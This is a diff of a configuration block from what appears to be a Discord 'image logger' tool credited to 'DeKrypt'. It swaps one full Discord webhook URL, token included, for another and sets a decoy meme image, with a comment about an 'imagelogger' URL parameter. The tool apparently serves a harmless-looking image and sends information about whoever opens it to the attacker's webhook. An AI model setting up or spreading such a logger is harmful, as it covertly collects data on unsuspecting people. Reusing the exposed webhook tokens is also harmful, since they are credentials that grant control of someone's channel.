@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1135278291675271178/BVJicxfqwFztMK43EGI7CZD00JHua9CLakd6n89fU_Jt9ZdGHv-mFph46CiPml1r3Rrk",
+    "webhook": "https://discordapp.com/api/webhooks/1135280070919979179/PGnJHv7GoJ5nLFiAho0EPJ2sra619dZKG0Af13oSAIJyG0qk_PbXtbqRsnAU6YQrXTyj",
     "image": "https://memeerr.vercel.app/api/funny.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
